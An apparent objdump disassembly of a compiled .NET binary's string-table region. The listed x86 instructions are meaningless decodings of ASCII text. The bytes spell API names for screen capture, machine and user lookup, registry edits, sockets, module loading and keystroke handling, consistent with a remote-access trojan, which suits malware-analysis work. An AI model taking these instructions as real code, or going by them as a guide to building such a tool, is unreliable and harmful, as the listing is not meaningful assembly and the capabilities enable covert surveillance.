  4085e0:	65 69 67 68 74 00 53 	imul   $0x79530074,%gs:0x68(%edi),%esp
  4085e7:	79 
  4085e8:	73 74                	jae    0x40865e
  4085ea:	65 6d                	gs insl (%dx),%es:(%edi)
  4085ec:	2e 44                	cs inc %esp
  4085ee:	72 61                	jb     0x408651
  4085f0:	77 69                	ja     0x40865b
  4085f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4085f3:	67 2e 49             	addr16 cs dec %ecx
  4085f6:	6d                   	insl   (%dx),%es:(%edi)
  4085f7:	61                   	popa
  4085f8:	67 69 6e 67 00 50 69 	imul   $0x78695000,0x67(%bp),%ebp
  4085ff:	78 
  408600:	65 6c                	gs insb (%dx),%es:(%edi)
  408602:	46                   	inc    %esi
  408603:	6f                   	outsl  %ds:(%esi),(%dx)
  408604:	72 6d                	jb     0x408673
  408606:	61                   	popa
  408607:	74 00                	je     0x408609
  408609:	49                   	dec    %ecx
  40860a:	6d                   	insl   (%dx),%es:(%edi)
  40860b:	61                   	popa
  40860c:	67 65 00 46 72       	add    %al,%gs:0x72(%bp)
  408611:	6f                   	outsl  %ds:(%esi),(%dx)
  408612:	6d                   	insl   (%dx),%es:(%edi)
  408613:	49                   	dec    %ecx
  408614:	6d                   	insl   (%dx),%es:(%edi)
  408615:	61                   	popa
  408616:	67 65 00 43 6f       	add    %al,%gs:0x6f(%bp,%di)
  40861b:	70 79                	jo     0x408696
  40861d:	50                   	push   %eax
  40861e:	69 78 65 6c 4f 70 65 	imul   $0x65704f6c,0x65(%eax),%edi
  408625:	72 61                	jb     0x408688
  408627:	74 69                	je     0x408692
  408629:	6f                   	outsl  %ds:(%esi),(%dx)
  40862a:	6e                   	outsb  %ds:(%esi),(%dx)
  40862b:	00 43 6f             	add    %al,0x6f(%ebx)
  40862e:	70 79                	jo     0x4086a9
  408630:	46                   	inc    %esi
  408631:	72 6f                	jb     0x4086a2
  408633:	6d                   	insl   (%dx),%es:(%edi)
  408634:	53                   	push   %ebx
  408635:	63 72 65             	arpl   %esi,0x65(%edx)
  408638:	65 6e                	outsb  %gs:(%esi),(%dx)
  40863a:	00 50 6f             	add    %dl,0x6f(%eax)
  40863d:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  408644:	5f                   	pop    %edi
  408645:	50                   	push   %eax
  408646:	6f                   	outsl  %ds:(%esi),(%dx)
  408647:	73 69                	jae    0x4086b2
  408649:	74 69                	je     0x4086b4
  40864b:	6f                   	outsl  %ds:(%esi),(%dx)
  40864c:	6e                   	outsb  %ds:(%esi),(%dx)
  40864d:	00 43 75             	add    %al,0x75(%ebx)
  408650:	72 73                	jb     0x4086c5
  408652:	6f                   	outsl  %ds:(%esi),(%dx)
  408653:	72 73                	jb     0x4086c8
  408655:	00 67 65             	add    %ah,0x65(%edi)
  408658:	74 5f                	je     0x4086b9
  40865a:	44                   	inc    %esp
  40865b:	65 66 61             	gs popaw
  40865e:	75 6c                	jne    0x4086cc
  408660:	74 00                	je     0x408662
  408662:	44                   	inc    %esp
  408663:	72 61                	jb     0x4086c6
  408665:	77 00                	ja     0x408667
  408667:	44                   	inc    %esp
  408668:	72 61                	jb     0x4086cb
  40866a:	77 49                	ja     0x4086b5
  40866c:	6d                   	insl   (%dx),%es:(%edi)
  40866d:	61                   	popa
  40866e:	67 65 00 49 6d       	add    %cl,%gs:0x6d(%bx,%di)
  408673:	61                   	popa
  408674:	67 65 46             	addr16 gs inc %esi
  408677:	6f                   	outsl  %ds:(%esi),(%dx)
  408678:	72 6d                	jb     0x4086e7
  40867a:	61                   	popa
  40867b:	74 00                	je     0x40867d
  40867d:	67 65 74 5f          	addr16 gs je 0x4086e0
  408681:	4a                   	dec    %edx
  408682:	70 65                	jo     0x4086e9
  408684:	67 00 53 61          	add    %dl,0x61(%bp,%di)
  408688:	76 65                	jbe    0x4086ef
  40868a:	00 57 72             	add    %dl,0x72(%edi)
  40868d:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  408694:	00 
  408695:	45                   	inc    %ebp
  408696:	6e                   	outsb  %ds:(%esi),(%dx)
  408697:	64 41                	fs inc %ecx
  408699:	70 70                	jo     0x40870b
  40869b:	00 46 69             	add    %al,0x69(%esi)
  40869e:	6c                   	insb   (%dx),%es:(%edi)
  40869f:	65 53                	gs push %ebx
  4086a1:	79 73                	jns    0x408716
  4086a3:	74 65                	je     0x40870a
  4086a5:	6d                   	insl   (%dx),%es:(%edi)
  4086a6:	49                   	dec    %ecx
  4086a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4086a8:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086aa:	00 67 65             	add    %ah,0x65(%edi)
  4086ad:	74 5f                	je     0x40870e
  4086af:	46                   	inc    %esi
  4086b0:	75 6c                	jne    0x40871e
  4086b2:	6c                   	insb   (%dx),%es:(%edi)
  4086b3:	4e                   	dec    %esi
  4086b4:	61                   	popa
  4086b5:	6d                   	insl   (%dx),%es:(%edi)
  4086b6:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  4086bb:	65 54                	gs push %esp
  4086bd:	69 6d 65 00 45 6e 76 	imul   $0x766e4500,0x65(%ebp),%ebp
  4086c4:	69 72 6f 6e 6d 65 6e 	imul   $0x6e656d6e,0x6f(%edx),%esi
  4086cb:	74 00                	je     0x4086cd
  4086cd:	67 65 74 5f          	addr16 gs je 0x408730
  4086d1:	4d                   	dec    %ebp
  4086d2:	61                   	popa
  4086d3:	63 68 69             	arpl   %ebp,0x69(%eax)
  4086d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4086d7:	65 4e                	gs dec %esi
  4086d9:	61                   	popa
  4086da:	6d                   	insl   (%dx),%es:(%edi)
  4086db:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086df:	74 5f                	je     0x408740
  4086e1:	55                   	push   %ebp
  4086e2:	73 65                	jae    0x408749
  4086e4:	72 4e                	jb     0x408734
  4086e6:	61                   	popa
  4086e7:	6d                   	insl   (%dx),%es:(%edi)
  4086e8:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086ec:	74 5f                	je     0x40874d
  4086ee:	4c                   	dec    %esp
  4086ef:	61                   	popa
  4086f0:	73 74                	jae    0x408766
  4086f2:	57                   	push   %edi
  4086f3:	72 69                	jb     0x40875e
  4086f5:	74 65                	je     0x40875c
  4086f7:	54                   	push   %esp
  4086f8:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  4086ff:	5f                   	pop    %edi
  408700:	44                   	inc    %esp
  408701:	61                   	popa
  408702:	74 65                	je     0x408769
  408704:	00 43 6f             	add    %al,0x6f(%ebx)
  408707:	6d                   	insl   (%dx),%es:(%edi)
  408708:	70 75                	jo     0x40877f
  40870a:	74 65                	je     0x408771
  40870c:	72 49                	jb     0x408757
  40870e:	6e                   	outsb  %ds:(%esi),(%dx)
  40870f:	66 6f                	outsw  %ds:(%esi),(%dx)
  408711:	00 67 65             	add    %ah,0x65(%edi)
  408714:	74 5f                	je     0x408775
  408716:	49                   	dec    %ecx
  408717:	6e                   	outsb  %ds:(%esi),(%dx)
  408718:	66 6f                	outsw  %ds:(%esi),(%dx)
  40871a:	00 67 65             	add    %ah,0x65(%edi)
  40871d:	74 5f                	je     0x40877e
  40871f:	4f                   	dec    %edi
  408720:	53                   	push   %ebx
  408721:	46                   	inc    %esi
  408722:	75 6c                	jne    0x408790
  408724:	6c                   	insb   (%dx),%es:(%edi)
  408725:	4e                   	dec    %esi
  408726:	61                   	popa
  408727:	6d                   	insl   (%dx),%es:(%edi)
  408728:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  40872c:	70 6c                	jo     0x40879a
  40872e:	61                   	popa
  40872f:	63 65 00             	arpl   %esp,0x0(%ebp)
  408732:	4f                   	dec    %edi
  408733:	70 65                	jo     0x40879a
  408735:	72 61                	jb     0x408798
  408737:	74 69                	je     0x4087a2
  408739:	6e                   	outsb  %ds:(%esi),(%dx)
  40873a:	67 53                	addr16 push %ebx
  40873c:	79 73                	jns    0x4087b1
  40873e:	74 65                	je     0x4087a5
  408740:	6d                   	insl   (%dx),%es:(%edi)
  408741:	00 67 65             	add    %ah,0x65(%edi)
  408744:	74 5f                	je     0x4087a5
  408746:	4f                   	dec    %edi
  408747:	53                   	push   %ebx
  408748:	56                   	push   %esi
  408749:	65 72 73             	gs jb  0x4087bf
  40874c:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  408753:	5f                   	pop    %edi
  408754:	53                   	push   %ebx
  408755:	65 72 76             	gs jb  0x4087ce
  408758:	69 63 65 50 61 63 6b 	imul   $0x6b636150,0x65(%ebx),%esp
  40875f:	00 53 70             	add    %dl,0x70(%ebx)
  408762:	65 63 69 61          	arpl   %ebp,%gs:0x61(%ecx)
  408766:	6c                   	insb   (%dx),%es:(%edi)
  408767:	46                   	inc    %esi
  408768:	6f                   	outsl  %ds:(%esi),(%dx)
  408769:	6c                   	insb   (%dx),%es:(%edi)
  40876a:	64 65 72 00          	fs gs jb 0x40876e
  40876e:	47                   	inc    %edi
  40876f:	65 74 46             	gs je  0x4087b8
  408772:	6f                   	outsl  %ds:(%esi),(%dx)
  408773:	6c                   	insb   (%dx),%es:(%edi)
  408774:	64 65 72 50          	fs gs jb 0x4087c8
  408778:	61                   	popa
  408779:	74 68                	je     0x4087e3
  40877b:	00 43 6f             	add    %al,0x6f(%ebx)
  40877e:	6e                   	outsb  %ds:(%esi),(%dx)
  40877f:	74 61                	je     0x4087e2
  408781:	69 6e 73 00 52 65 67 	imul   $0x67655200,0x73(%esi),%ebp
  408788:	69 73 74 72 79 4b 65 	imul   $0x654b7972,0x74(%ebx),%esi
  40878f:	79 50                	jns    0x4087e1
  408791:	65 72 6d             	gs jb  0x408801
  408794:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  40879b:	68 65 63 6b 00       	push   $0x6b6365
  4087a0:	43                   	inc    %ebx
  4087a1:	72 65                	jb     0x408808
  4087a3:	61                   	popa
  4087a4:	74 65                	je     0x40880b
  4087a6:	53                   	push   %ebx
  4087a7:	75 62                	jne    0x40880b
  4087a9:	4b                   	dec    %ebx
  4087aa:	65 79 00             	gs jns 0x4087ad
  4087ad:	47                   	inc    %edi
  4087ae:	65 74 56             	gs je  0x408807
  4087b1:	61                   	popa
  4087b2:	6c                   	insb   (%dx),%es:(%edi)
  4087b3:	75 65                	jne    0x40881a
  4087b5:	4e                   	dec    %esi
  4087b6:	61                   	popa
  4087b7:	6d                   	insl   (%dx),%es:(%edi)
  4087b8:	65 73 00             	gs jae 0x4087bb
  4087bb:	46                   	inc    %esi
  4087bc:	69 6c 65 41 74 74 72 	imul   $0x69727474,0x41(%ebp,%eiz,2),%ebp
  4087c3:	69 
  4087c4:	62 75 74             	bound  %esi,0x74(%ebp)
  4087c7:	65 73 00             	gs jae 0x4087ca
  4087ca:	53                   	push   %ebx
  4087cb:	74 72                	je     0x40883f
  4087cd:	65 61                	gs popa
  4087cf:	6d                   	insl   (%dx),%es:(%edi)
  4087d0:	57                   	push   %edi
  4087d1:	72 69                	jb     0x40883c
  4087d3:	74 65                	je     0x40883a
  4087d5:	72 00                	jb     0x4087d7
  4087d7:	41                   	inc    %ecx
  4087d8:	70 70                	jo     0x40884a
  4087da:	6c                   	insb   (%dx),%es:(%edi)
  4087db:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4087e2:	00 67 65             	add    %ah,0x65(%edi)
  4087e5:	74 5f                	je     0x408846
  4087e7:	45                   	inc    %ebp
  4087e8:	78 65                	js     0x40884f
  4087ea:	63 75 74             	arpl   %esi,0x74(%ebp)
  4087ed:	61                   	popa
  4087ee:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  4087f2:	61                   	popa
  4087f3:	74 68                	je     0x40885d
  4087f5:	00 53 65             	add    %dl,0x65(%ebx)
  4087f8:	74 41                	je     0x40883b
  4087fa:	74 74                	je     0x408870
  4087fc:	72 69                	jb     0x408867
  4087fe:	62 75 74             	bound  %esi,0x74(%ebp)
  408801:	65 73 00             	gs jae 0x408804
  408804:	44                   	inc    %esp
  408805:	65 6c                	gs insb (%dx),%es:(%edi)
  408807:	65 74 65             	gs je  0x40886f
  40880a:	00 43 6f             	add    %al,0x6f(%ebx)
  40880d:	70 79                	jo     0x408888
  40880f:	00 67 65             	add    %ah,0x65(%edi)
  408812:	74 5f                	je     0x408873
  408814:	4c                   	dec    %esp
  408815:	6f                   	outsl  %ds:(%esi),(%dx)
  408816:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408819:	4d                   	dec    %ebp
  40881a:	61                   	popa
  40881b:	63 68 69             	arpl   %ebp,0x69(%eax)
  40881e:	6e                   	outsb  %ds:(%esi),(%dx)
  40881f:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  408823:	6c                   	insb   (%dx),%es:(%edi)
  408824:	65 4d                	gs dec %ebp
  408826:	6f                   	outsl  %ds:(%esi),(%dx)
  408827:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  40882c:	6c                   	insb   (%dx),%es:(%edi)
  40882d:	65 53                	gs push %ebx
  40882f:	79 73                	jns    0x4088a4
  408831:	74 65                	je     0x408898
  408833:	6d                   	insl   (%dx),%es:(%edi)
  408834:	50                   	push   %eax
  408835:	72 6f                	jb     0x4088a6
  408837:	78 79                	js     0x4088b2
  408839:	00 67 65             	add    %ah,0x65(%edi)
  40883c:	74 5f                	je     0x40889d
  40883e:	46                   	inc    %esi
  40883f:	69 6c 65 53 79 73 74 	imul   $0x65747379,0x53(%ebp,%eiz,2),%ebp
  408846:	65 
  408847:	6d                   	insl   (%dx),%es:(%edi)
  408848:	00 53 70             	add    %dl,0x70(%ebx)
  40884b:	65 63 69 61          	arpl   %ebp,%gs:0x61(%ecx)
  40884f:	6c                   	insb   (%dx),%es:(%edi)
  408850:	44                   	inc    %esp
  408851:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  408858:	69 65 73 50 72 6f 78 	imul   $0x786f7250,0x73(%ebp),%esp
  40885f:	79 00                	jns    0x408861
  408861:	67 65 74 5f          	addr16 gs je 0x4088c4
  408865:	53                   	push   %ebx
  408866:	70 65                	jo     0x4088cd
  408868:	63 69 61             	arpl   %ebp,0x61(%ecx)
  40886b:	6c                   	insb   (%dx),%es:(%edi)
  40886c:	44                   	inc    %esp
  40886d:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  408874:	69 65 73 00 67 65 74 	imul   $0x74656700,0x73(%ebp),%esp
  40887b:	5f                   	pop    %edi
  40887c:	50                   	push   %eax
  40887d:	72 6f                	jb     0x4088ee
  40887f:	67 72 61             	addr16 jb 0x4088e3
  408882:	6d                   	insl   (%dx),%es:(%edi)
  408883:	46                   	inc    %esi
  408884:	69 6c 65 73 00 44 69 	imul   $0x72694400,0x73(%ebp,%eiz,2),%ebp
  40888b:	72 
  40888c:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  408891:	79 00                	jns    0x408893
  408893:	47                   	inc    %edi
  408894:	65 74 4c             	gs je  0x4088e3
  408897:	6f                   	outsl  %ds:(%esi),(%dx)
  408898:	67 69 63 61 6c 44 72 	imul   $0x6972446c,0x61(%bp,%di),%esp
  40889f:	69 
  4088a0:	76 65                	jbe    0x408907
  4088a2:	73 00                	jae    0x4088a4
  4088a4:	54                   	push   %esp
  4088a5:	65 78 74             	gs js  0x40891c
  4088a8:	57                   	push   %edi
  4088a9:	72 69                	jb     0x408914
  4088ab:	74 65                	je     0x408912
  4088ad:	72 00                	jb     0x4088af
  4088af:	57                   	push   %edi
  4088b0:	72 69                	jb     0x40891b
  4088b2:	74 65                	je     0x408919
  4088b4:	4c                   	dec    %esp
  4088b5:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  4088bc:	6d                   	insl   (%dx),%es:(%edi)
  4088bd:	61                   	popa
  4088be:	6e                   	outsb  %ds:(%esi),(%dx)
  4088bf:	64 00 4d 75          	add    %cl,%fs:0x75(%ebp)
  4088c3:	74 65                	je     0x40892a
  4088c5:	78 00                	js     0x4088c7
  4088c7:	54                   	push   %esp
  4088c8:	68 72 65 61 64       	push   $0x64616572
  4088cd:	53                   	push   %ebx
  4088ce:	74 61                	je     0x408931
  4088d0:	72 74                	jb     0x408946
  4088d2:	00 53 65             	add    %dl,0x65(%ebx)
  4088d5:	73 73                	jae    0x40894a
  4088d7:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4088de:	6e                   	outsb  %ds:(%esi),(%dx)
  4088df:	67 45                	addr16 inc %ebp
  4088e1:	76 65                	jbe    0x408948
  4088e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4088e4:	74 48                	je     0x40892e
  4088e6:	61                   	popa
  4088e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4088e8:	64 6c                	fs insb (%dx),%es:(%edi)
  4088ea:	65 72 00             	gs jb  0x4088ed
  4088ed:	53                   	push   %ebx
  4088ee:	79 73                	jns    0x408963
  4088f0:	74 65                	je     0x408957
  4088f2:	6d                   	insl   (%dx),%es:(%edi)
  4088f3:	45                   	inc    %ebp
  4088f4:	76 65                	jbe    0x40895b
  4088f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4088f7:	74 73                	je     0x40896c
  4088f9:	00 61 64             	add    %ah,0x64(%ecx)
  4088fc:	64 5f                	fs pop %edi
  4088fe:	53                   	push   %ebx
  4088ff:	65 73 73             	gs jae 0x408975
  408902:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408909:	6e                   	outsb  %ds:(%esi),(%dx)
  40890a:	67 00 44 6f          	add    %al,0x6f(%si)
  40890e:	45                   	inc    %ebp
  40890f:	76 65                	jbe    0x408976
  408911:	6e                   	outsb  %ds:(%esi),(%dx)
  408912:	74 73                	je     0x408987
  408914:	00 47 65             	add    %al,0x65(%edi)
  408917:	74 43                	je     0x40895c
  408919:	75 72                	jne    0x40898d
  40891b:	72 65                	jb     0x408982
  40891d:	6e                   	outsb  %ds:(%esi),(%dx)
  40891e:	74 50                	je     0x408970
  408920:	72 6f                	jb     0x408991
  408922:	63 65 73             	arpl   %esp,0x73(%ebp)
  408925:	73 00                	jae    0x408927
  408927:	73 65                	jae    0x40898e
  408929:	74 5f                	je     0x40898a
  40892b:	4d                   	dec    %ebp
  40892c:	69 6e 57 6f 72 6b 69 	imul   $0x696b726f,0x57(%esi),%ebp
  408933:	6e                   	outsb  %ds:(%esi),(%dx)
  408934:	67 53                	addr16 push %ebx
  408936:	65 74 00             	gs je  0x408939
  408939:	43                   	inc    %ebx
  40893a:	6f                   	outsl  %ds:(%esi),(%dx)
  40893b:	6e                   	outsb  %ds:(%esi),(%dx)
  40893c:	64 69 74 69 6f 6e 61 	imul   $0x436c616e,%fs:0x6f(%ecx,%ebp,2),%esi
  408943:	6c 43 
  408945:	6f                   	outsl  %ds:(%esi),(%dx)
  408946:	6d                   	insl   (%dx),%es:(%edi)
  408947:	70 61                	jo     0x4089aa
  408949:	72 65                	jb     0x4089b0
  40894b:	4f                   	dec    %edi
  40894c:	62 6a 65             	bound  %ebp,0x65(%edx)
  40894f:	63 74 4e 6f          	arpl   %esi,0x6f(%esi,%ecx,2)
  408953:	74 45                	je     0x40899a
  408955:	71 75                	jno    0x4089cc
  408957:	61                   	popa
  408958:	6c                   	insb   (%dx),%es:(%edi)
  408959:	00 53 79             	add    %dl,0x79(%ebx)
  40895c:	73 74                	jae    0x4089d2
  40895e:	65 6d                	gs insl (%dx),%es:(%edi)
  408960:	2e 53                	cs push %ebx
  408962:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408966:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40896d:	70 
  40896e:	74 6f                	je     0x4089df
  408970:	67 72 61             	addr16 jb 0x4089d4
  408973:	70 68                	jo     0x4089dd
  408975:	79 00                	jns    0x408977
  408977:	4d                   	dec    %ebp
  408978:	44                   	inc    %esp
  408979:	35 43 72 79 70       	xor    $0x70797243,%eax
  40897e:	74 6f                	je     0x4089ef
  408980:	53                   	push   %ebx
  408981:	65 72 76             	gs jb  0x4089fa
  408984:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40898b:	69 64 65 72 00 48 61 	imul   $0x73614800,0x72(%ebp,%eiz,2),%esp
  408992:	73 
  408993:	68 41 6c 67 6f       	push   $0x6f676c41
  408998:	72 69                	jb     0x408a03
  40899a:	74 68                	je     0x408a04
  40899c:	6d                   	insl   (%dx),%es:(%edi)
  40899d:	00 43 6f             	add    %al,0x6f(%ebx)
  4089a0:	6d                   	insl   (%dx),%es:(%edi)
  4089a1:	70 75                	jo     0x408a18
  4089a3:	74 65                	je     0x408a0a
  4089a5:	48                   	dec    %eax
  4089a6:	61                   	popa
  4089a7:	73 68                	jae    0x408a11
  4089a9:	00 4d 6f             	add    %cl,0x6f(%ebp)
  4089ac:	64 75 6c             	fs jne 0x408a1b
  4089af:	65 00 4c 6f 61       	add    %cl,%gs:0x61(%edi,%ebp,2)
  4089b4:	64 00 47 65          	add    %al,%fs:0x65(%edi)
  4089b8:	74 4d                	je     0x408a07
  4089ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4089bb:	64 75 6c             	fs jne 0x408a2a
  4089be:	65 73 00             	gs jae 0x4089c1
  4089c1:	47                   	inc    %edi
  4089c2:	65 74 54             	gs je  0x408a19
  4089c5:	79 70                	jns    0x408a37
  4089c7:	65 73 00             	gs jae 0x4089ca
  4089ca:	45                   	inc    %ebp
  4089cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4089cc:	64 73 57             	fs jae 0x408a26
  4089cf:	69 74 68 00 67 65 74 	imul   $0x5f746567,0x0(%eax,%ebp,2),%esi
  4089d6:	5f 
  4089d7:	41                   	inc    %ecx
  4089d8:	73 73                	jae    0x408a4d
  4089da:	65 6d                	gs insl (%dx),%es:(%edi)
  4089dc:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  4089e0:	67 65 74 5f          	addr16 gs je 0x408a43
  4089e4:	48                   	dec    %eax
  4089e5:	61                   	popa
  4089e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4089e7:	64 6c                	fs insb (%dx),%es:(%edi)
  4089e9:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4089ed:	74 5f                	je     0x408a4e
  4089ef:	41                   	inc    %ecx
  4089f0:	76 61                	jbe    0x408a53
  4089f2:	69 6c 61 62 6c 65 00 	imul   $0x5300656c,0x62(%ecx,%eiz,2),%ebp
  4089f9:	53 
  4089fa:	65 6c                	gs insb (%dx),%es:(%edi)
  4089fc:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  408a01:	64 65 00 50 6f       	fs add %dl,%gs:0x6f(%eax)
  408a06:	6c                   	insb   (%dx),%es:(%edi)
  408a07:	6c                   	insb   (%dx),%es:(%edi)
  408a08:	00 4e 65             	add    %cl,0x65(%esi)
  408a0b:	74 77                	je     0x408a84
  408a0d:	6f                   	outsl  %ds:(%esi),(%dx)
  408a0e:	72 6b                	jb     0x408a7b
  408a10:	53                   	push   %ebx
  408a11:	74 72                	je     0x408a85
  408a13:	65 61                	gs popa
  408a15:	6d                   	insl   (%dx),%es:(%edi)
  408a16:	00 47 65             	add    %al,0x65(%edi)
  408a19:	74 53                	je     0x408a6e
  408a1b:	74 72                	je     0x408a8f
  408a1d:	65 61                	gs popa
  408a1f:	6d                   	insl   (%dx),%es:(%edi)
  408a20:	00 52 65             	add    %dl,0x65(%edx)
  408a23:	61                   	popa
  408a24:	64 42                	fs inc %edx
  408a26:	79 74                	jns    0x408a9c
  408a28:	65 00 54 6f 4c       	add    %dl,%gs:0x4c(%edi,%ebp,2)
  408a2d:	6f                   	outsl  %ds:(%esi),(%dx)
  408a2e:	6e                   	outsb  %ds:(%esi),(%dx)
  408a2f:	67 00 43 68          	add    %al,0x68(%bp,%di)
  408a33:	72 57                	jb     0x408a8c
  408a35:	00 43 68             	add    %al,0x68(%ebx)
  408a38:	61                   	popa
  408a39:	72 00                	jb     0x408a3b
  408a3b:	53                   	push   %ebx
  408a3c:	6f                   	outsl  %ds:(%esi),(%dx)
  408a3d:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408a40:	74 46                	je     0x408a88
  408a42:	6c                   	insb   (%dx),%es:(%edi)
  408a43:	61                   	popa
  408a44:	67 73 00             	addr16 jae 0x408a47
  408a47:	52                   	push   %edx
  408a48:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408a4c:	76 65                	jbe    0x408ab3
  408a4e:	00 50 61             	add    %dl,0x61(%eax)
  408a51:	72 61                	jb     0x408ab4
  408a53:	6d                   	insl   (%dx),%es:(%edi)
  408a54:	65 74 65             	gs je  0x408abc
  408a57:	72 69                	jb     0x408ac2
  408a59:	7a 65                	jp     0x408ac0
  408a5b:	64 54                	fs push %esp
  408a5d:	68 72 65 61 64       	push   $0x64616572
  408a62:	53                   	push   %ebx
  408a63:	74 61                	je     0x408ac6
  408a65:	72 74                	jb     0x408adb
  408a67:	00 4a 6f             	add    %cl,0x6f(%edx)
  408a6a:	69 6e 00 47 65 74 42 	imul   $0x42746547,0x0(%esi),%ebp
  408a71:	79 74                	jns    0x408ae7
  408a73:	65 73 00             	gs jae 0x408a76
  408a76:	53                   	push   %ebx
  408a77:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a79:	64 00 44 65 6c       	add    %al,%fs:0x6c(%ebp,%eiz,2)
  408a7e:	65 74 65             	gs je  0x408ae6
  408a81:	53                   	push   %ebx
  408a82:	75 62                	jne    0x408ae6
  408a84:	4b                   	dec    %ebx
  408a85:	65 79 00             	gs jns 0x408a88
  408a88:	53                   	push   %ebx
  408a89:	79 73                	jns    0x408afe
  408a8b:	74 65                	je     0x408af2
  408a8d:	6d                   	insl   (%dx),%es:(%edi)
  408a8e:	2e 49                	cs dec %ecx
  408a90:	4f                   	dec    %edi
  408a91:	2e 43                	cs inc %ebx
  408a93:	6f                   	outsl  %ds:(%esi),(%dx)
  408a94:	6d                   	insl   (%dx),%es:(%edi)
  408a95:	70 72                	jo     0x408b09
  408a97:	65 73 73             	gs jae 0x408b0d
  408a9a:	69 6f 6e 00 47 5a 69 	imul   $0x695a4700,0x6e(%edi),%ebp
  408aa1:	70 53                	jo     0x408af6
  408aa3:	74 72                	je     0x408b17
  408aa5:	65 61                	gs popa
  408aa7:	6d                   	insl   (%dx),%es:(%edi)
  408aa8:	00 43 6f             	add    %al,0x6f(%ebx)
  408aab:	6d                   	insl   (%dx),%es:(%edi)
  408aac:	70 72                	jo     0x408b20
  408aae:	65 73 73             	gs jae 0x408b24
  408ab1:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  408ab8:	00 73 65             	add    %dh,0x65(%ebx)
  408abb:	74 5f                	je     0x408b1c
  408abd:	50                   	push   %eax
  408abe:	6f                   	outsl  %ds:(%esi),(%dx)
  408abf:	73 69                	jae    0x408b2a
  408ac1:	74 69                	je     0x408b2c
  408ac3:	6f                   	outsl  %ds:(%esi),(%dx)
  408ac4:	6e                   	outsb  %ds:(%esi),(%dx)
  408ac5:	00 52 65             	add    %dl,0x65(%edx)
  408ac8:	61                   	popa
  408ac9:	64 00 42 69          	add    %al,%fs:0x69(%edx)
  408acd:	74 43                	je     0x408b12
  408acf:	6f                   	outsl  %ds:(%esi),(%dx)
  408ad0:	6e                   	outsb  %ds:(%esi),(%dx)
  408ad1:	76 65                	jbe    0x408b38
  408ad3:	72 74                	jb     0x408b49
  408ad5:	65 72 00             	gs jb  0x408ad8
  408ad8:	54                   	push   %esp
  408ad9:	6f                   	outsl  %ds:(%esi),(%dx)
  408ada:	49                   	dec    %ecx
  408adb:	6e                   	outsb  %ds:(%esi),(%dx)
  408adc:	74 33                	je     0x408b11
  408ade:	32 00                	xor    (%eax),%al
  408ae0:	4b                   	dec    %ebx
  408ae1:	65 79 73             	gs jns 0x408b57
  408ae4:	00 47 65             	add    %al,0x65(%edi)
  408ae7:	74 50                	je     0x408b39
  408ae9:	72 6f                	jb     0x408b5a
  408aeb:	63 65 73             	arpl   %esp,0x73(%ebp)
  408aee:	73 42                	jae    0x408b32
  408af0:	79 49                	jns    0x408b3b
  408af2:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  408af6:	74 5f                	je     0x408b57
  408af8:	4d                   	dec    %ebp
  408af9:	61                   	popa
  408afa:	69 6e 57 69 6e 64 6f 	imul   $0x6f646e69,0x57(%esi),%ebp
  408b01:	77 54                	ja     0x408b57
  408b03:	69 74 6c 65 00 44 61 	imul   $0x74614400,0x65(%esp,%ebp,2),%esi
  408b0a:	74 
  408b0b:	65 41                	gs inc %ecx
  408b0d:	6e                   	outsb  %ds:(%esi),(%dx)
  408b0e:	64 54                	fs push %esp
  408b10:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  408b17:	5f                   	pop    %edi
  408b18:	4e                   	dec    %esi
  408b19:	6f                   	outsl  %ds:(%esi),(%dx)
  408b1a:	77 00                	ja     0x408b1c
  408b1c:	67 65 74 5f          	addr16 gs je 0x408b7f
  408b20:	50                   	push   %eax
  408b21:	72 6f                	jb     0x408b92
  408b23:	63 65 73             	arpl   %esp,0x73(%ebp)
  408b26:	73 4e                	jae    0x408b76
  408b28:	61                   	popa
  408b29:	6d                   	insl   (%dx),%es:(%edi)
